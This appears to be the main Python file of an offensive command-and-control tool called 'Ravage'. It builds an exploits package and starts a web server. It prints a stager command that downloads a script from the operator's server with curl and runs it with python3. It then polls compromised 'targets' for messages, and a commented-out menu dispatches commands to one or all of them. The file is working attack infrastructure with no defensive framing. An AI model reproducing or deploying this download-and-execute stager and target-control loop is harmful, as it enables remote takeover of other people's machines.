import logging
from time import sleep

import web_server
import config
from exploits_src import build as exploits_src


def main():
    config.logger = logging.getLogger()
    exploits_src.build()
    web_server.main()

    print('______\n| ___ \\\n| |_/ /__ ___   ____ _  __ _  ___\n|    // _` \\ \\ / / _` |/ _` |/ _ \\\n| |\\ \\ (_| |\\ V / (_| | (_| |  __/\n\\_| \\_\\__,_| \\_/ \\__,_|\\__, |\\___|\n                        __/ |\n                       |___/\n')
    print(f'curl {config.soundwave_ip}:{web_server.WEB_SERVER_PORT}/wheelie > tmp.py; python3 tmp.py')
    print('-' * 60)
    print('\n\n')

    while True:
        # message = config.messages_received.get()
        # config.logger.info(f'Message {message}')
        while True:
            sleep(1)
            for target in config.targets:
                message = target.get_received_message(False)
                if message is not None:
                    print(message)
        # print('Enter Command Number:')
        # for i in range(len(commands.all_commands)):
        #     print(f'{i + 1} : {commands.all_commands[i].key}')
        #
        # try:
        #     num = int(input(''))
        #     assert 1 <= num <= len(commands.all_commands)
        # except ValueError or AssertionError:
        #     pass
        # else:
        #     command = commands.all_commands[num - 1]
        #     print('Select target:\n-1 : Back\n0 : All')
        #     for i in range(len(config.targets)):
        #         print(f'{i + 1} : {config.targets[i].name}')
        #
        #     try:
        #         num = int(input(''))
        #         assert -1 <= num <= len(config.targets)
        #     except ValueError or AssertionError:
        #         pass
        #     else:
        #         if num == -1:
        #             break
        #         elif num == 0:
        #             for target in config.targets:
        #                 result = communication.send_command_to_target(command, target)
        #                 if result is not None:
        #                     print(result)
        #         else:
        #             result = communication.send_command_to_target(command, config.targets[num - 1])
        #             if result is not None:
        #                 print(result)


if __name__ == '__main__':
    main()
